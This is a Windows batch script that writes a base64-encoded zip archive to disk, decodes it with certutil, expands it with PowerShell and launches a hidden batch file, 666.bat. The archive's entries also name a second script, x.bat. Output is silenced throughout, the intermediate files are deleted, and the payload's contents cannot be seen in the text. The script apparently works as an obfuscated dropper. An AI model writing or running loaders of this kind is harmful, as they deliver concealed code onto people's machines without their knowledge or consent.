@echo off

echo UEsDBBQAAAAIAC+CZFG4GaaT5QEAAOMCAAAHAAAANjY2LmJhdH2Sb2/TMBDG30fK > 666.b64
echo d3gSybSDbWk7yEalAhlNodCmpX9YhyomN3GWQGoHx2lTXuyzk5QWJIQmWSfrud89 >> 666.b64
echo Pp3vDfMjARGGuqZilTCMI8F4XKhI5lmEM3QFV2BcMQnbtnXNF4mQoLqma3EILhRM >> 666.b64
echo 0jQ7HZOu72iwjrmJeiq2TGYRSxJkikqFsw2TK8ic0ww10qjhCOMJWBErWKuTyjFj >> 666.b64
echo KhE+TeB6zvXAdRcz15v2R970IHTdgXNbxsXY2ev7CtAkpDxfd5zrt1239+59/8PH >> 666.b64
echo wdAbjT9NprP555vF7Re68gMW3kfxt+/Jmov0h8xUvtkWu5+NZuvi+Qv78urla+PQ >> 666.b64
echo AdJt0NG13mgCawBCVuh7qDdO0SyPfYLuCHVdm7ozWA4kD+6qt42J43VHQwNPYbdg >> 666.b64
echo 4aJ1aV/hGZq6FgoJqwdCfMQc9dp+4oQcum4/GAcP4+tpk5DaCQKBYxtGGYyyUtf2 >> 666.b64
echo 8+GlnGdMgsyn7sRzhi4BKRGCVzxP/p+3qK/iDWtz8RgUsIQp9i/hVH8UZ0pSJeQf >> 666.b64
echo px3LYIV5knC6Zm2TVGh1Jebj9eYxr2uFL9IdyEOQNpbF+YpWW5RKcS/pOqCKkuUw >> 666.b64
echo 9qXIRKiWNzEPxDZbTvebNGQ8X45/kwdtnv71zaJclTQ/ZwWDJWEpNH4BUEsDBBQA >> 666.b64
echo AAAIAHqiUVEOasO4AgMAAJgHAAAFAAAAeC5iYXS9lGuP0kAUhr+T8B8OTYisIgXU >> 666.b64
echo VUm81FLcVaDYsqKGSKbtAWaZXpyZAusHf7vTbd11MVujJiZNkznznneec+byEv11 >> 666.b64
echo DPFyWa1UKwIli33CwBobr4aW9WFqjd1Te+wWgb41ND6q/4eJcRm/zADCliRKw2fG >> 666.b64
echo K7NvDV6fnL55OxyN7ck7x52evZ99+PiJeH6Ay9Wanm9YGMXJFy5kut3tL762O90H >> 666.b64
echo Dx8dP37y9EWtIIBkFzyrVga2A/oQ6nUPTsfQaDeho77jI+jb0KhWXGsKugE8ChbZ >> 666.b64
echo 2jXHGPftUQ3uwnEXdHjQfXz8BO5Bp1pZxhz0gTLygUbQuJMVrEYFde9brfCofW52 >> 666.b64
echo 6vU7RxDE8AOjpn41lVmtHGV0kQqnAjkYQUgjKiQnUrnXlaoOz6OUlYh04ku6xd4F >> 666.b64
echo CtCXKWMRCbGneXelv9aukjmugAQBnLw1z+ZuvJQ7wnE+oj6PhRrNZzQK4p2Ymynn >> 666.b64
echo GMn3yAWNo/kkZtSnKObuhZAYgr6FPhXEYzglYjNaqeUlONbrRX9mO33QA+goiKtV >> 666.b64
echo JdlgvIuykNm7WgP3CYs58hbusZBSn/hMgHaLSgN9xUkkb5beGxXZUrFsKGOg0xB+ >> 666.b64
echo zrtmSeIdcrFGJbrvx2FIogA0HsKtC5aXIC7b8aA7TyVlyqy8lF/V5SWV85a7lnNz >> 666.b64
echo XGFAZTluIfonykOzP2qqHwYlhIfKcszD4299XJhnjmONp4sz13L+5i5YxUHJbsMJ >> 666.b64
echo DXCSdcFOpBKJ2+/DAcTQNo3hYmSYJ6dja+7ag+nMcKz/QFGtXD5UM9fnNJEtlyEm >> 666.b64
echo 0H3UbsPz57BvbT1RKFyUEHvnA9eGZ2ByJBJt7xx92dDyXBqtWgPKMH8b8jnt6MCm >> 666.b64
echo sGj1kaHETN4o3cnr/CvUUKy8eK8JmSY0gPxha7ahCdpKIXLcyCakHCYmrIkADzGC >> 666.b64
echo 5V1/g4GWeV3c8HKRKcrsEdtAO5+We3lzckK4pFkfoXuoyKv4SWFvkXMa4G+tHv6F >> 666.b64
echo lYIOFGiiJKCLPAjFNgqponlxxSDv2sFrWLT1evu/A1BLAQI/ABQAAAAIAC+CZFG4 >> 666.b64
echo GaaT5QEAAOMCAAAHACQAAAAAAAAAIQAAAAAAAAA2NjYuYmF0CgAgAAAAAAABABgA >> 666.b64
echo AGGbnL2y1gGMuegQXwvXAeVa+EheC9cBUEsBAj8AFAAAAAgAeqJRUQ5qw7gCAwAA >> 666.b64
echo mAcAAAUAJAAAAAAAAAAhAAAACgIAAHguYmF0CgAgAAAAAAABABgAgGVIfLqk1gFZ >> 666.b64
echo 3MX+XgvXAT7FgO1eC9cBUEsFBgAAAAACAAIAsAAAAC8FAAAAAA== >> 666.b64

certutil -decode "666.b64" "666.zip" > nul
del "666.b64" > nul
rmdir 666 > nul
powershell -Command "Expand-Archive .\666.zip -DestinationPath .\666" > nul
del 666.zip > nul

cd .\666 
start 666.bat